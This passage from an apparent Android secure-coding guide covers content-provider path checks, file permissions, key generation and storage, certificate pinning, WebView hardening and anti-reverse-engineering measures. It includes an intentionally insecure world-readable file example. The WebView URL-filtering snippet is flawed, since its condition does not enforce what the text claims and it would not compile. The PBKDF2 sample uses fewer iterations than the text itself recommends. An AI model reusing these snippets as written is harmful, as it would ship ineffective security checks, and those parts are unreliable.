\"book\");\nstatement.bindString(1, \"wiley\");\nstatement.execute();\nMaking use of prepared statements ensures that user input is properly escaped and does not become part of the\nSQL query itself.\nDirectory Traversal\nThe basis of checking whether another application is attempting a directory traversal attack against a content\nprovider is to test the resulting folder against a known good value. This comes down to checks that a file being\nrequested resides in an “allowed” folder.\nYou accomplish this by using the getCanonicalPath()method of the File class. This translates a path into one\nthat has the resulting . and .. characters removed and worked into the resultant path. Perform this check and\nthen compare it against a list of allowed files in a certain directory or against the location of the directory itself\nto prevent against this attack. The following code limits other applications to only reading files within the\n/files/ directory inside your application's private data directory:\n@Override\npublic ParcelFileDescriptor openFile (Uri uri, String mode)\n{\ntry\n{\nString baseFolder = getContext().getFilesDir().getPath();\nFile requestedFile = new File(uri.getPath());\n//Only allow the retrieval of files from the /files/\n//directory in the private data directory\nif (requestedFile.getCanonicalPath().startsWith(baseFolder))\nreturn ParcelFileDescriptor.open(requestedFile,\nParcelFileDescriptor.MODE_READ_ONLY);\nelse\nreturn null;\n}\ncatch (FileNotFoundException e)\n{\nreturn null;\n}\ncatch (IOException e)\n{\nreturn null;\n}\n}\nPattern Matching\nWhen performing any pattern-matching checks against a requested content URI, always be careful about the\nimplications of using a literal pattern match in the <path-permission> tag in the form of the android:path\nattribute.\nThere may be other valid forms of the requested data that are not covered by your logic, so rather use a check\nthat a certain prefix is present, or if possible, create a regular expression for the comparison. Here is an example\nof using a prefix for the comparison and enforcement of a path-permission:\n<provider\nandroid:name=\".ContentProvider\"\nandroid:authorities=\"com.myapp.ContentProvider\"\nandroid:multiprocess=\"true\"\nandroid:exported=\"true\" >\n<path-permission\nandroid:pathPrefix=\"/Data\"\nandroid:readPermission=\"com.myapp.READ_DATA\"\nandroid:writePermission=\"com.myapp.WRITE_DATA\"/>\n</provider>\nInstead of the android:pathPrefix used in this example, you could use a regular expression as follows:\nandroid:pathPattern=\"/Data.*\"\nSecuring Broadcast Receivers\nIn addition to all standard application component security measures, the only outlier is the use of secret codes.\nDespite their name, these codes can easily be enumerated using a number of tools available on the Play Store. A\nuser or attacker who knows your implemented secret code should not be able to have any control over the\napplication other than that provided when launching the application in the normal way. Secret codes should be\nused only for convenience or testing purposes. Ideally, if you use them for testing or debugging purposes then\nremove them before releasing the application into production. Scrutinize the code inside the broadcast receiver\nto ensure that an unintended action cannot be performed by simply invoking the secret code. On some devices\nand older versions of Android, invoking these codes from the browser by visiting a crafted website is possible.\nThis means that performing an action automatically upon receipt of the broadcast from the dialer is especially\ndangerous.\nStoring Files Securely\nThe storage of any information on the device by an application, must be done in a secure manner. The Android\nsandbox for application data is not enough to create a truly secure application. We've shown multiple times how\nto defeat this sandbox through misconfiguration and exploitation of the system. Therefore, the assumption that\nan attacker cannot reach files sitting in a private data directory is somewhat naive.\nCreating Files and Folders Securely\nWhen creating a file, explicitly stating the file permissions is better than relying on the umask set by the system.\nThe following is an example of explicitly stating the permissions so that only the application that created it can\naccess and modify the file:\nFileOutputStream secretFile = openFileOutput(\"secret\",\nContext.MODE_PRIVATE);\nSimilarly, you can create a folder within the application's private data directory that is set with secure\npermissions as follows:\nFile newdir = getDir(\"newdir\", Context.MODE_PRIVATE);\nSome examples on the Internet show similar code examples, but without the use of the static final integers\nthat represent the permissions. Such an example that actually makes a newly created file world readable is\nshown here:\nFileOutputStream secretFile = openFileOutput(\"secret\", 1);\nUsing direct integers that represent the permissions is not advised because it is not clear when reviewing code at\na glance what the outcome will be.\nWhen using native code to create a file, you can also explicitly specify permissions. This example shows how to\ndo so in the open function:\nFILE * secretFile = open(\"/data/data/com.myapp/files/secret\",\nO_CREAT|O_RDWR, S_IRUSR|S_IWUSR);\nThis creates the file with permissions that only allow the application owner to read and write to it.\nUsing Encryption\nPrevious chapters discussed attacks that can be used to expose the contents of a private data directory. Such\nattacks highlight the importance of going that extra step and encrypting any sensitive files that reside on disk.\nWhen storing sensitive files on the SD card, you absolutely must encrypt it. This applies to data being read from\nthe SD card as well because the ability to manipulate input files could be an entry point into the application for\nan attacker. You should view the SD card as a public area on the device and take care when using it for storage.\nThe field of encryption is a heavily technical one that is only lightly explored in the next section. An important\npoint is that creating your own encryption schemes is not an acceptable solution. Widely accepted encryption\nschemes are mathematically proven and have spent many years in peer review by professional cryptographers.\nDo not discount the kind of time and effort put into these endeavors; the outcome assures you that widely\nknown encryption algorithms will always provide you with better security than custom ones. The following are a\nset of safe decisions that are in line with the recommendations from professional cryptographers:\nUse at minimum 256-bit AES for symmetric key encryption. Avoid using ECB (Electronic Code Book) mode\nbecause it will allow an attacker to discover patterns in data between different encrypted blocks.\nUse 2048-bit RSA for asymmetric encryption.\nUse SHA-256 or SHA-512 as a hashing algorithm.\nIf it is possible to salt passwords, then do so with a randomly generated string. This method is especially\nuseful when you need to hash a password of some sort. The salt is not a secret and can be stored alongside\nthe encrypted information. Salting prevents the use of pre-computed rainbow tables to recover passwords\nand is not a secret in itself.\nUsing Random Numbers, Key Generation, and Key Storage\nIf at any point in your application you need to generate a random number or obtain a key that is used for\ncryptographic purposes, then you must watch out for a number of things. The most important of these are as\nfollows:\nNever seed a pseudo-random number generator (PRNG) using the current date and time. This is a\ndeterministic seed value that is not suitable for key generation. Versions of Android prior to 4.2 would\ngenerate the same identical sequence of numbers from SecureRandom when given the same seed, because the\nseed was not mixed in with the internal source of entropy but rather replaced. This means that on these\nversions, any generated random numbers could be guessed if the attacker iteratively brute-forced a set of\nprobable seed values.\nNever seed a PRNG with a constant number. If this seed is recovered from the decompiled code then an\nattacker could also use it to recover the sequence of numbers generated by the PRNG.\nNever use device values like an International Mobile Equipment Identity (IMEI) number or Android ID as\nthe encryption key or as input to one. An attacker can easily retrieve these values, especially if he has gained\narbitrary code execution on the device.\nWhen making use of key derivation functions, never use constant salt values and always use iterations of\n10,000 or more. This will make the use of a rainbow tables infeasible and the brute-forcing of passwords\nexpensive.\nNow that you have read about some of the things that you should not do, it's time to look at possible solutions.\nTo generate a random number, you use SecureRandom, but you must take care in the way that it is seeded.\nSeeding with a non-deterministic seed is important and you should use many inputs to create it to guarantee\nrandomness. The Android Developers Blog has excellent code for generating seed values (http://android-\ndevelopers.blogspot .co.uk/2013/08/some-securerandom-thoughts.html). The technique used mixes: the\ncurrent time, PID, UID, build fingerprint, and hardware serial number into the Linux PRNG at /dev/urandom.\nTo generate a 256-bit AES key that is seeded only from default system entropy, you can use the following code:\nSecureRandom sr = new SecureRandom();\nKeyGenerator generator = KeyGenerator.getInstance(\"AES\");\ngenerator.init(256, sr);\nSecretKey key = generator.generateKey();\nIf you use this code, then the burning question is where should you store the key? This question is one of the\nbiggest problems faced by developers wanting to encrypt application files. It is a tricky question with many\ndiffering opinions about the correct solution. The answer should depend on the type and sensitivity of the\napplication but some possible solutions are discussed here.\nA solution that is not acceptable is hard-coding the password in the source code. You have seen how easily an\nattacker can decompile an application and obtain such keys, which makes the measure completely ineffective.\nFor high-security applications the answer is simple: The user should hold the key. If the application requires\nsome form of password to access it then the entered password should be used to derive the encryption key via a\nkey derivation function such as PBKDF2. This ensures that the encryption key can be derived only from the\ncorrect user password. If an attacker obtains an encrypted file, then he can attempt to brute-force the password\nand run it through the key derivation function to decrypt the file. However, this attack is largely infeasible when\nstrong passwords are used. A functional implementation of using a user password or pin to generate the\nencryption key is provided by Google at http://android-developers.blogspot.com/2013/02/using-\ncryptography-to-store-credentials.html and is shown here:\npublic static SecretKey generateKey(char[] passphraseOrPin, byte[] salt)\nthrows NoSuchAlgorithmException, InvalidKeySpecException {\n// Number of PBKDF2 hardening rounds to use. Larger values increase\n// computation time. Select a value that causes\n// computation to take >100ms.\nfinal int iterations = 1000;\n// Generate a 256-bit key\nfinal int outputKeyLength = 256;\nSecretKeyFactory secretKeyFactory =\nSecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA1\");\nKeySpec keySpec = new PBEKeySpec(passphraseOrPin, salt, iterations,\noutputKeyLength);\nSecretKey secretKey = secretKeyFactory.generateSecret(keySpec);\nreturn secretKey;\n}\nThe salt in the previous implementation can be any randomly generated value that is stored alongside the\nencrypted data in the application's private data directory.\nFor applications where user-derived encryption keys are not possible, you must take a best effort approach. If\nthe encryption key is not making use of something from the user then it must be stored somewhere on the\ndevice or retrieved from the linked application web service. Storing the encryption key in the same folder as the\nencrypted file would probably be of little use because if an attacker is able to retrieve the encrypted file, he\nmight also be able to read other files in the same directory. A location that provides more security is the\nAccountManager feature in Android. The AccountManager allows an application to store a password that can only\nbe accessed again by the application that added it. A check is performed when calling the getPassword() method\nthat the caller has the AUTHENTICATE_ACCOUNTS permission and that the UID of the caller is same as the one that\nadded the account. This measure is decent for protecting the password from malicious applications but will not\nprotect this password from attackers with privileged access such as root. It is not strictly supposed to be used for\nthis purpose but versions of Android prior to 4.3 did not have a suitable solution for storing symmetric keys\nsecurely.\nIf your application targets Android API level 18 and later then making use of the Android Keystore System may\nbe a better measure. This specific type of KeyStore (see\nhttp://developer.android.com/reference/java/security/KeyStore.html) is only available to your application\nUID. Only asymmetric keys can be added, which means that the stored key would have to be used to encrypt a\nsymmetric key that resided somewhere else on the device.\nExposing Files Securely to Other Applications\nConsider the scenario where your application generates PDF documents that the user must view in another\napplication. You do not want to put these documents on the SD card because that is considered a public storage\narea and these documents might contain sensitive information. You also do not want to mark the document as\nworld readable and place it in your application's private data directory so that the document reader can reach it\nbecause then effectively any application can reach it, too.\nIn this case using a content provider as an access-control mechanism for the document may be wise. Android\nhas this scenario covered by making use of a feature called the granting of URI permissions. Consider the\nfollowing content provider declaration in a manifest:\n<provider\nandroid:name=\".DocProvider\"\nandroid:authorities=\"com.myapp.docs\"\nandroid:exported=\"true\"\nandroid:permission=\"com.myapp.docs.READWRITE\"\nandroid:grantUriPermissions=\"false\">\n<grant-uri-permission android:pathPrefix=\"/document/\" />\n</provider>\nAn application that wanted to read or write to this content provider directly would have to hold the\ncom.myapp.docs.READWRITE permission. However, the line that sets grantUriPermissions to false and the\n<grant-uri-permission> tag specifies the paths to which other applications can be granted temporary access.\nThis combination means that only a content URI prefixed with /document/ can be made available using the\ngrant URI permission functionality. This protects the rest of the content provider from being accessed by any\nexternal application without holding the specified permission.\nThe following example of this application uses the grant URI permission functionality to open a generated PDF\nin an external PDF reader:\nUri uri = Uri.parse(\"content://com.myapp.docs/document/1\");\nIntent intent = new Intent(Intent.ACTION_VIEW);\nintent.setDataAndType(uri, \"application/pdf\");\nintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\nintent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);\nstartActivity(intent);\nNotice that the only difference between this code and normal opening of an exposed content URI is the\nFLAG_GRANT_READ_URI_PERMISSION flag added to the intent.\nThe previous code is certainly the easiest method of performing this action but is not the most secure. What if a\nmalicious application on the device registered an intent filter that specified it is able to handle PDF documents?\nThe document might end up being accessible to the malicious application because the intent created was an\nimplicit one! A more secure method is to explicitly grant the URI permission to the application that will be\nretrieving the document. You can do this by providing a configuration activity or a pop-up containing the list of\napplications that are suitable to open PDFs prior to launching the intent that actually opens the PDF reader. A\nlist of all applications that can handle PDF documents can be retrieved using the queryIntentActivities\nmethod of the PackageManager class. After the user has selected a PDF reader then the name of the package can\nbe provided to the grantUriPermission method as follows:\ngrantUriPermission(\"com.thirdparty.pdfviewer\", uri,\nIntent.FLAG_GRANT_READ_URI_PERMISSION);\nAfter performing this code, an explicit intent can be created to open the PDF in the chosen reader. After the\napplication is sure that the user does not require access to the PDF any more, the URI permission can be\nrevoked using the following code:\nrevokeUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION);\nThis method maintains the security of the content provider by enforcing a permission and allows the exposure\nof select files to third-party applications in a flexible way.\nCreating Secure Communications\nThe power of many mobile applications comes from being able to interface with services on the Internet.\nUnfortunately, this also means that the user's data that is being communicated may be susceptible to\ncompromise when traversing hostile networks. This section explores some ways to ensure that information is\ntransported securely to and from Internet services. It also provides a brief caution against implementing custom\nIPC mechanisms.\nInternet Communications\nAn application should never use cleartext communications with Internet services because it is a risk for traffic\ninterception attacks. An attacker anywhere along the path between the user's device and the Internet server\nwould be able to intercept and modify content in both directions or simply sniff this traffic to divulge its\ncontents. This is especially not acceptable if an application uses Internet services that require user credentials to\nbe submitted by the application. An attacker may not gain direct value from accessing the service being logged\ninto; however, attackers also know that humans are creatures of habit. Users may make use of the same\npassword on an arbitrary Internet service as they do for their email account or other sensitive services.\nIn addition to the risk of exposing user data, cleartext channels present a multitude of dangers to the application\nitself. Chapter 8 covered this topic discussing various ways to exploit a device by manipulating HTTP traffic.\nTherefore, we recommend that you avoid cleartext channels at all costs.\nAndroid comprises of APIs that you can use to create very secure communication channels. Differing opinions\nexist in the security world about what constitutes a “secure connection.” However, the general consensus is that\nthe use of SSL with some form of additional protection is acceptable for most use cases. The problem with\ngeneral-purpose SSL is that it relies on the security of a large number of trusted certificate authorities (CAs) for\nvalidation. The compromise of a single trusted CA affects the security of all clients that trust this CA.\nCompromising the signing certificate of a widely trusted CA means that fraudulent certificates can be issued for\nyour website or other SSL endpoints. An attacker who uses a fraudulent certificate in a traffic interception attack\nwould be able to capture traffic without the user receiving any warnings because the approach of attributing\ntrust through the use of trusted CAs is doing exactly what it says on the tin. Compromising a trusted CA\ncertificate is a known weak point.\nThe compromise of a CA signing certificate may sound like an unlikely event, but in recent years it has occurred\na number of times. To protect against this type of compromise, having applications implement SSL certificate\npinning is recommended. This is when certain attributes of the certificate presented by the server are validated\nagainst stored values and the connection is allowed only if these values check out. In fact, some well-known\ncryptographers such as Moxie Marlinspike have recommended not using CAs at all when implementing mobile\napplications. He discussed this in his blog post at http://thoughtcrime.org/blog/authenticity-is-broken-in-\nssl-but-your-app-ha/.\nImplementing SSL certificate pinning can be tricky if you are not knowledgeable on the specifics of X.509\ncertificates and their structure. One way of creating your own SSL certificate pinning implementation is creating\na new class that extends X509TrustManager and implementing the certificate checks in the checkServerTrusted\nmethod. The technique used by Moxie inside this method was to compare the hash of the SPKI\n(SubjectPublicKeyInfo) of the certificate against a stored value. Using this technique means that only the\nissuer's key information will be checked, and so you are basically providing assurance that the certificate is\nsigned by the correct CA. This check is relatively lightweight and does not come with the hassles of pushing\napplication updates every time your website's certificate expires. Moxie has also written an Android Library that\nprovides an easy way for developers to add SSL certificate pinning to their connections. The documentation in\nhis project provides an example that shows how to retrieve data from https://www.google.com using a pinned\nconnection:\nString[] pins = new String[] {\"f30012bbc18c231ac1a44b788e410ce754182513\"};\nURL url = new URL(\"https://www.google.com\");\nHttpsURLConnection connection =\nPinningHelper.getPinnedHttpsURLConnection(context, pins, url);\nYou can find further examples and the source code that implements the checks at\nhttps://github.com/moxie0/AndroidPinning. If you decide not to make use of SSL certificate pinning then at\nleast mandate the use of SSL. Before releasing an application, perform thorough checks on the sections of code\nhandling the SSL connection to ensure that no certificate-bypassing hacks have been left in use. Validation of\nthe certificate should be done by the system or carefully implemented by someone who fully understands SSL\nusing a custom HostnameVerifier and TrustManager.\nSome applications may require exceptionally secure communication channels that do not rely solely on the\nsecurity of SSL. In this case, you could add an additional encryption layer that makes use of a symmetric key\nthat is generated upon first use of the application. This decreases the likelihood that if an attacker is able to\nbreak the SSL layer of the encryption, that he will be able to gain access to the actual contents of the\ncommunication. This is because he would first need to gain access to the device to extract the key.\nLocal Communications\nAndroid has a rich set of APIs for communication between applications. This diminishes the need to come up\nwith a unique way of transferring data from one application to another using network sockets, the clipboard, or\nsome other arbitrary mechanism. In fact, doing so decreases the security of the application because\nimplementing the same level of security the built-in APIs have is hard. If an arbitrary IPC mechanism must be\nimplemented for some reason then it should always include checks for verifying which application is connecting\nto it. You need to think through all the ways that a malicious application could spoof a legitimate application's\nidentity.\nSecuring WebViews\nWebViews have a lot of functionality under the hood that an attacker can use to his advantage. Therefore,\nlimiting the attack surface as much as possible if you use WebViews in your application is important. If you are\nonly using a WebView to load a simple informational website then rather open the site in the Android browser\nby sending an intent containing the link. This method is more secure than having an embedded WebView\nbecause the Android browser loads content within the context of its own sandbox. If the browser were to get\ncompromised by this content, it would have no implications for the data being held by your application.\nHowever, sometimes legitimate use cases exist for implementing an embedded WebView.\nThe single biggest mistake made when implementing a WebView is loading cleartext HTTP content inside it\nbecause of the numerous attack methods that are available to an attacker who is able to load his own content\ninside the WebView. For this reason, only HTTPS links should be loaded inside a WebView, and code paths that\nallow another application on the same device to load arbitrary content in the WebView should be removed.\nThe following sections list recommendations for what you can do to limit what attackers can do if they are able\nto load their own content inside the WebView. David Hartley of MWR InfoSecurity documents these\nconsiderations at https://labs .mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/.\nJavaScript\nIf support for JavaScript is not required in the WebView, then you should disable it because it is usually the\nlaunching point for further attacks against the WebView. Being able to load dynamic code like JavaScript inside\nthe WebView gives the attacker the platform needed to exfiltrate data, redirect the page, create attack payloads,\nand perform any other arbitrary action required for exploitation. You can disable JavaScript by implementing\nthe following code:\nwebview.getSettings().setJavaScriptEnabled(false);\nJavaScriptInterface\nThe effects of exploiting a vulnerable WebView with an implemented JavaScriptInterface was shown in\nChapter 8. You can completely avoid this by simply not using a JavaScriptInterface if the functionality can be\nprovided in another way. If no other option exists, set the following attributes in the application manifest to\nensure that gaining arbitrary code execution using the JavaScriptInterface and CVE-2012-6636 is not possible:\n<uses-sdk android:minSdkVersion=\"17\"\nandroid:targetSdkVersion=\"17\"/>\nYou can then annotate methods exposed over the bridge with @JavascriptInterface. Note that this limits the\nversions of Android that can run this application.\nPlug-Ins\nWebView plug-ins can provide third-party application vendors the ability to provide additional functionality. For\nexample, Flash from Adobe is a plug-in that can be used inside a WebView. The plug-ins functionality has been\ndeprecated from API version 18 (Jelly Bean 4.3) and higher but you should explicitly disable it in case older\nversions of Android are being used by your userbase. You do that using the following code:\nwebview.getSettings().setPluginState(PluginState.OFF);\nSetting this value helps protect against the exploitation of vulnerable WebView plug-ins and the “Fake ID”\nvulnerability that was briefly discussed in Chapter 8.\nAccess to Information\nWebViews by default are allowed to load files from the filesystem. This poses a problem when a vulnerability\nexists that allows a malicious application to open local files inside another application's WebView. This opens\nthe exposed WebView to all the available exploitation techniques. You can disable filesystem access from a\nWebView as follows:\nwebview.getSettings().setAllowFileAccess(false);\nThis will not stop the WebView from being able to load from its own application's resources or assets folder\nusing file:///android_res and file:///android_asset. To lock down the WebView even further, you should\nnot allow loaded pages from the filesystem to access other files on the filesystem. This will stop these loaded\npages from exfiltrating other files out to the Internet. The following setting helps protect against this:\nwebview.getSettings().setAllowFileAccessFromFileURLs(false);\nFurthermore, you can protect a WebView from being able to access content providers on the device by using the\nfollowing setting:\nwebview.getSettings().setAllowContentAccess(false);\nWeb Content Validation\nIf a WebView is connecting to a pre-defined set of pages that are known to the developer before the release of\nthe application, then performing additional checks to ensure that no other page is attempting to load inside the\nWebView is best. You can do so by overriding the WebViewClient's shouldInterceptRequest method as follows:\n@Override\npublic WebResourceResponse shouldInterceptRequest (final WebView view,\nString url)\n{\nUri uri = Uri.parse(url);\nif (!uri.getHost.equals(\"www.mysite.com\") &&\n!uri.getScheme.equals(\"https\"))\n{\nreturn new WebResourceResponse(\"text/html\", \"UTF-8\",\nnew StringBufferInputStream(\"alert('Not happening')\")\n}\nelse\n{\nreturn super.shouldInterceptRequest(view, url);\n}\n}\nThe previous example will load pages from www.mysite.com only when they are being loaded over HTTPS.\nConfiguring the Android Manifest\nThe exploitation of some issues on Android do not arise from insecure code, but rather a lack of understanding\nof each configuration available in the Android manifest. This section contains some configurations to be aware\nof in the manifest file.\nApplication Backups\nTo ensure that an attacker with physical access to a device is not able to download the contents of an\napplication's private data directory using \"adb backup,\" you can implement a single fix. In the application's\nAndroidManifest.xml file, set the android:allowBackup attribute to false. By default, this attribute is set to true\nand backups are allowed.\nSetting the Debuggable Flag\nTo ensure that your application cannot be exploited by an attacker with physical access to the device, or on older\ndevices by another application, the application should not be searching for a debugger. The android:debuggable\nattribute in the AndroidManifest.xml should explicitly be set to false prior to building the release version of the\napplication. Having the application built automatically with the debuggable flag set to false is possible in\ncommon Android IDEs, and if you are comfortable with your configuration then by all means make use of it.\nHowever, explicitly setting this flag in conjunction with having manual pre-release checks performed on the\nAPK will always ensure that the application does not go into production with this flag set.\nAPI Version Targeting\nDevelopers have the ability to create Android applications that are largely backward compatible and have a\nsingle code base that works on a range of old and new devices. However, Google trusts that the developer is\ninformed about what features and modifications have been made in each API version to make sure that an\napplication remains backward compatible.\nTwo important attributes regarding API version targeting in an application's manifest are minSdkVersion and\ntargetSdkVersion in the <uses-sdk> tag. minSdkVersion states the minimum API level that the application can\nwork on. targetSdkVersion states the API version that ensures the set of features that the application is\nintended to run on is available. Having differing versions between minSdkVersion and targetSdkVersion means\nthat your code should be detecting what platform features are not available on older devices and providing\nalternatives.\nThese values also have implications for security. When security fixes that change certain features in existing\ncomponents are performed, they are activated only if you are targeting an API version equal to or greater than\nthe version where the security fix was implemented. For example, content providers on older versions of\nAndroid were exported by default. However, if you set your minSdkVersion or targetSdkVersion to 17 or greater,\nthe content provider is no longer exported by default.\nThe latest versions of Android have security fixes included but sometimes they need to keep these fixes\nunimplemented for older API versions so that backward compatibility is maintained. Therefore, targeting the\nlargest targetSdkVersion value possible is important so that users of new devices get the benefits of security\nfixes made to the platform. This may require extra effort in keeping up with changes, but it benefits the security\nof your application. A great example of where this is important is when using a WebView with a\nJavaScriptInterface. If your version is targeting an API level smaller than 17, your application will still be\nvulnerable to code execution regardless of which Android version the application is running on.\nCorrectly targeting API versions also applies for native code that is bundled with your application. The targeted\nAPI versions can be set in the Android.mk file as follows:\nAPP_PLATFORM := android-16\nThe bigger the value, the more security features are enabled but the fewer devices are supported. A defining\npoint for security in the Android NDK took place at API 16 where PIE (Position Independent Executable) was\nenabled in order to ensure full ASLR on devices. However, PIE binaries were not enforced until Android 5.0\nLollipop and targeting API versions smaller than 16 will cause binaries not to run on this version and upward.\nThe only solution is to provide two versions of the same binary bundled with your application and use the\ncorrect one for the version of Android your application is running on.\nLogging\nLogging is essential during development, but can inadvertently expose information if it's left on in release\nbuilds. Keeping track of whether these logging functions are commented out when going into production is\ndifficult for a developer. Instead of waiting until production release time to check and disable logging functions,\nyou can use a centralized logging class. This class should contain a flag that can be turned on and off depending\non whether you want logging enabled during development or have it all turned off for production releases. You\ncan even link this logging function to a check for BuildConfig .DEBUG, but this approach may also be prone to\nerrors, and using your own defined constant is safer. Defining a central logging function can apply to native code\nas well and the on/off flag can be implemented by using define. Using a custom logging class eliminates all\npotential failure points in terms of logging sensitive information.\nAdditionally, by making use of a tool like ProGuard (see http://developer\n.android.com/tools/help/proguard.html), you can also remove the logging functions from code. The following\nsolution was provided by David Caunt on StackOverflow to remove logging; you specify the following inside\nproguard .cfg:\n-assumenosideeffects class android.util.Log {\npublic static *** d(...);\npublic static *** v(...);\npublic static *** i(...);\n}\nReducing the Risk of Native Code\nNative code is notoriously hard to secure but sometimes is required within an application. You can reduce the\nrisk of using native code by limiting its exposure to the outside world. Scrutinize any entry points into native\ncode and treat them as high risk factors of the application. Any native code that can be replaced with its Java\nequivalent without affecting the goals of the application should be replaced. If you are using any third-party\nlibraries, these should also be kept up to date to ensure that the latest security fixes are included.\nAnother way of contributing to the mitigating factors of using native code is by making sure that all exploit\nmitigations are enabled when compiling the code. This was made quite simple by the Android NDK and the\nsecret is to always use the latest version of the NDK and target the highest possible API version. The NDK\nenables as many exploit mitigations as possible by default. In fact, you need to explicitly turn them off if you do\nnot want them enabled for some reason. These exploit mitigations should not be an excuse for coding\ninsecurely, though, and you should make every effort to check the code for possible bugs. A minimum effort of\nmaking sure that some common native coding mistakes are not present is a prerequisite.\nTobias Klein created an excellent script named checksec to show which exploit mitigations are enabled on a\nlibrary or executable. You can download it from his site at http://www.trapkit.de/tools/checksec.html. You\ncan use this script to verify that all expected exploit mitigations have been enabled on your native components.\nHere is an example of running this against a demo shared library created using the NDK:\n$ ./checksec.sh --file libtest.so\nRELRO STACK CANARY NX PIE RPATH RUNPATH FILE\nFull RELRO Canary found NX enabled DSO No RPATH No RUNPATH libtest.so\nThe previous output shows that all important exploit mitigations have been enabled on this library. Performing\nthe same test of an example busybox binary downloaded from an unofficial source on the Internet reveals the\nfollowing:\n$ ./checksec.sh --file busybox\nRELRO STACK CANARY NX PIE RPATH RUNPATH FILE\nNo RELRO No canary found NX enabled No PIE No RPATH No RUNPATH busybox\nThe exploit mitigations have not been enabled for this binary, which will make exploitation of any bugs inside it\neasier. This script is very useful for doing a quick verification that suitable exploit mitigations are enabled before\ngoing live with your application. The output is self-explanatory if you are familiar with the available exploit\nmitigations offered on Android. However, even as a beginner the output of checksec makes spotting disabled\nmitigations easy because it highlights them in red.\nCHECKSEC NOT EXECUTING?\nFor readers who are new to Linux, after you have downloaded this script you would need to mark it as\nexecutable before being able to use it. You do this using the chmod command and then verifying that the\nfile is executable:\n$ chmod +x checksec.sh\n$ ls -l checksec.sh\n-rwxrwxr-x 1 tyrone tyrone 27095 Nov 17 2011 checksec.sh\nAdvanced Security Mechanisms\nThis section explores security mechanisms that are generally not implemented in everyday applications. These\nare reserved for developers looking to go above and beyond the call of duty to secure their applications.\nProtection Level Downgrade Detection\nChapter 7 explored how it was possible to downgrade application protection levels by installing a malicious\napplication that defined a permission first with an insecure protection level. Therefore, having applications that\nhold sensitive data perform an additional check to ensure that the security of the custom permissions defined\nhave not been downgraded to a less secure protection level is important. You do this by running a check at each\nentry point protected by a custom permission that ensures that all the custom permissions defined still have the\ncorrect protection levels set. The following code shows a functional implementation of this check:\npublic void definedPermissionsSecurityOk(Context con)\n{\nPackageManager pm = con.getPackageManager();\ntry\n{\nPackageInfo myPackageInfo = pm.getPackageInfo(con.getPackageName(),\nPackageManager.GET_PERMISSIONS);\nPermissionInfo[] definedPermissions = myPackageInfo.permissions;\nfor (int i = 0; i < definedPermissions.length; i++)\n{\nint protLevelReportedBySystem = pm.getPermissionInfo(\ndefinedPermissions[i].name,\n0).protectionLevel;\nif (definedPermissions[i].protectionLevel !=\nprotLevelReportedBySystem)\n{\nthrow new SecurityException(\"protectionLevel mismatch for \"\n+ definedPermissions[i].name);\n}\n}\n}\ncatch (NameNotFoundException e)\n{\ne.printStackTrace();\n}\n}\nThis code snippet checks all the custom permissions defined by the application and compares the protection\nlevel specified in the manifest to the one that the system reports. If a discrepancy exists between these values,\nthe function throws a SecurityException, meaning that one of the permissions has been altered and may no\nlonger provide protection for exported components.\nUsing this function will stop downgrade attacks from taking place and could be used to alert the user and\ndeveloper of the situation.\nProtecting Non-Exported Components\nIf you recall from Chapter 7, privileged users such as root are able to invoke and interact with application\ncomponents even when they are not exported. If you as an application developer decide that this is not\nacceptable for your application then ways exist to protect against it. Note that regardless of any permissions\n(even with signature protection levels) set on an application component, stopping root from being able to\ninvoke it is not possible.\nOne way to prevent the invocation of components that are not meant to be accessible to any user except the\nlocal application is by implementing a request token system. When the application is started, a random token\ncan be generated and stored in a static variable inside the code. Then when the application itself issues an\nintent to other non-exported components, this token must be provided as an extra. When the component is\nstarted by any application including itself, the provided token should be checked by the application against the\nstored value and if it does not match, the component should immediately exit and not process any other data\nfurther. This check should be done before any other actions are performed. This technique is very useful for\nactivities but is not restricted to only being used by them. You can apply the concept in a similar way to other\napplication components that are not exported.\nSlowing Down a Reverse Engineer\nApplication developers who want to do so can put the following checks and measures in place, but these items\nare not a replacement for good application security practices. Defeating these checks will always be possible by\npatching them out of the application either statically or at runtime by a privileged user context. Therefore,\nperforming such checks may be a requirement but will only serve to slow down a skilled reverse engineer from\nbeing able to properly analyze an application's behavior.\nObfuscation\nAs discussed in previous chapters, compiled Android applications can easily be decompiled into readable source\ncode that resembles the original. To make a reverse engineer's life a tad more difficult, developers can use\nobfuscators to make the decompiled code less readable and harder to follow. Depending on how rigorous the\nobfuscation technique performed is, it could add significant time expenses for a reverse engineer. This fact may\ndeter the casual reverse engineer but will not stop someone who is determined to understand the code.\nYou should view this countermeasure as an in-depth defense measure that makes researching and planning\nattacks more difficult, rather than as a replacement for ensuring that any source code is as secure as possible.\nObfuscating source code does not prevent any inherent vulnerability from being exploited.\nVarious code obfuscators exist, ranging from free tools such as ProGuard (see\nhttp://developer.android.com/tools/help/proguard.html) to many paid options. The paid version of\nProGuard is called DexGuard (see https://www .saikoa.com/dexguard) and provides excellent features that can\nmake reverse-engineering applications tough.\nOther products that provide obfuscation are as follows:\nDashO—https://www.preemptive.com/products/dasho\nDexProtector—http://dexprotector.com\nApkProtect—http://www.apkprotect.com\nStringer—https://jfxstore.com/stringer\nAllitori—http://www.allatori.com\nJon Sawyer at Defcon 22 made an excellent comparison of some of these obfuscators and their features at\nhttps://www.defcon.org/images/defcon-22/dc-22-presentations/Strazzere-Sawyer/DEFCON-22-Strazzere-\nand-Sawyer-Android-Hacker-Protection-Level-UPDATED.pdf. Some commonly found features in these products\nare:\nString encryption\nClass encryption\nNative library encryption\nAsset encryption\nReflection to hide sensitive calls to APIs\nTamper detection\nRemoval of logging code\nClass and variable renaming\nControl flow mangling\nWatermarking\nMany of these products support native code obfuscation as well. However, the University of Applied Sciences\nand Arts Western Switzerland of Yverdon-les-Bains started an interesting open-source project called O-LLVM,\nand it is a fork of the LLVM (Low Level Virtual Machine) project that provides obfuscation and tamper proofing\nfor many languages and platforms. You can make use of it with the Android NDK, and it produces compiled code\nthat is very difficult to reverse engineer. The project page is available at https://github.com/obfuscator-\nllvm/obfuscator/wiki and is worth investigating if you require rigorous obfuscation of native code.\nRoot Detection\nSome applications may have legitimate reasons for needing to know whether the device they are running on is\nrooted. In practice, often very shallow checks are performed to determine this status. This section presents\nsome more in-depth methods to check whether the user of the device or other applications are able to obtain\nroot access. The most commonly implemented technique is to check for the existence of the su binary on the\npath. This is commonly done by executing which su and parsing the output, which 